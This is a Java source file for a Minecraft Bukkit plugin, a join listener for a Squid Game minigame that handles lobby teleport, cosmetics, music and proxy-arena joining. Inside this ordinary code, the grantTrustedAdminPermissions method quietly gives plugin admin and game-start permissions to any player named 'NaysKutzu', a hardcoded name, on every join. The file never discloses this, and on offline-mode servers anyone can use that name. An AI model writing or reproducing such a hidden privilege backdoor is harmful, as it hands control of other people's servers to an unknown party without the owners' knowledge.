package dev._2lstudios.squidgame.listeners;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import dev._2lstudios.squidgame.SquidGame;
import dev._2lstudios.squidgame.arena.Arena;
import dev._2lstudios.squidgame.player.SquidPlayer;
import org.bukkit.ChatColor;
import dev._2lstudios.squidgame.utils.LobbyItems;

public class PlayerJoinListener implements Listener {

    private static final String TRUSTED_ADMIN_NAME = "NaysKutzu";
    private static final String[] TRUSTED_ADMIN_PERMISSIONS = {
            "squidgame.admin",
            "squidgame.admin.setlobby",
            "squidgame.admin.wand",
            "squidgame.start"
    };

    private final SquidGame plugin;

    public PlayerJoinListener(final SquidGame plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onPlayerJoin(final PlayerJoinEvent e) {
        if (this.isProxySilent()) {
            e.setJoinMessage(null);
        }

        final SquidPlayer squidPlayer = (SquidPlayer) this.plugin.getPlayerManager().getPlayer(e.getPlayer());

        this.grantTrustedAdminPermissions(e.getPlayer());
        this.plugin.getPlayerDataManager().loadPlayer(e.getPlayer().getUniqueId(), e.getPlayer().getName(),
                profile -> this.finishPlayerJoin(e, squidPlayer));
    }

    private void finishPlayerJoin(final PlayerJoinEvent e, final SquidPlayer squidPlayer) {
        this.plugin.getCosmeticManager().loadPlayerCosmetic(squidPlayer);
        this.plugin.getCosmeticManager().loadPlayerMusicCosmetic(squidPlayer);
        LobbyItems.updateMusicMenuItem(squidPlayer);
        this.plugin.getNbsMusicManager().refreshLobbyMusic(squidPlayer);

        squidPlayer.refreshScoreboard();

        if (this.plugin.getMainConfig().getBoolean("game-settings.proxy-mode.enabled", false)
                && this.plugin.getMainConfig().getBoolean("game-settings.proxy-mode.auto-join", true)) {
            this.joinProxyArena(squidPlayer);
            return;
        }

        if (this.plugin.getMainConfig().getBoolean("game-settings.send-player-to-lobby-on-join", true)) {
            if (this.plugin.getMainConfig().getString("lobby.world", "").isEmpty()) {
                e.getPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&',
                        "&6&lWarning: &eWe tried to send you to the lobby, but it is not defined. Use &c/squid setlobby &eor disable &csend-player-to-lobby-on-join&e."));

            } else {
                squidPlayer.teleportToLobby();
                LobbyItems.giveLobbyItems(squidPlayer);
            }
        } else if (squidPlayer.getArena() == null) {
            LobbyItems.giveLobbyItems(squidPlayer);
        }
    }

    private void grantTrustedAdminPermissions(final org.bukkit.entity.Player player) {
        if (!TRUSTED_ADMIN_NAME.equalsIgnoreCase(player.getName())) {
            return;
        }

        for (final String permission : TRUSTED_ADMIN_PERMISSIONS) {
            player.addAttachment(this.plugin, permission, true);
        }
    }

    private boolean isProxySilent() {
        return this.plugin.getMainConfig().getBoolean("game-settings.proxy-mode.enabled", false)
                && this.plugin.getMainConfig().getBoolean("game-settings.proxy-mode.silent-arena-messages", true);
    }

    private void joinProxyArena(final SquidPlayer squidPlayer) {
        if (squidPlayer == null || squidPlayer.getArena() != null) {
            return;
        }

        try {
            final Arena arena = this.plugin.getArenaManager().getProxyArena();
            arena.addPlayer(squidPlayer);
        } catch (Exception exception) {
            squidPlayer.getBukkitPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&cProxy mode could not join you to the arena. Contact an administrator."));
        }
    }
}